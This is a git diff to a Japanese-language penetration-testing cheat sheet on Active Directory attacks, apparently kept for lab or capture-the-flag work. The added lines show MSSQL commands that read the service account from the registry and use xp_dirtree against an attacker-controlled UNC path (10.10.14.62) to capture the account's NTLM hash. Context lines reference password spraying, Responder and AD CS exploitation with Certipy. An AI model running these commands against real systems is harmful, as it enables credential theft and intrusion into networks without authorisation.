@@ -150,6 +150,17 @@ Invoke-DomainPasswordSpray -Password '<PASSWORD_TO_SPRAY>' -OutFile spray_succes
 ```shell
 sudo responder -I <NIC> 
 ```
+
+MSSQLへのログイン情報があったとき
+- サービスアカウントを確認する
+```sh
+exec master..xp_instance_regread N'HKEY_LOCAL_MACHINE', N'SYSTEM\CurrentControlSet\Services\MSSQL$SQLMOCK', N'ObjectName';
+```
+
+サービスアカウントのNTLMハッシュを取得する
+```sh
+exec master..xp_dirtree '\\10.10.14.62\share';
+```
 ### ntlm_theft
 SMBに書き込みができる時に使用例あり
 - https://github.com/Greenwolf/ntlm_theft
@@ -399,8 +410,8 @@ adidnsdump -u <DOMAIN_NAME>\\<USER> ldap//<DC_IP> -r
 ---
 # Lateral Movement
 他の資格情報を取得するための列挙・攻撃
-## 証明書関連の脆弱性
-### Certpy
+
+## Certpy
 - Active Directory Certificate Services（AD CS）に対する攻撃や調査を行えるツール
 - AD CS：Active Directory Certificate Services。Windowsドメイン環境に証明書を発行・管理するサービス。
 - Windowsドメイン環境で証明書ベースの権限昇格や認証回避などの脆弱性（たとえば ESC1〜ESC8）を検出・悪用するために使う
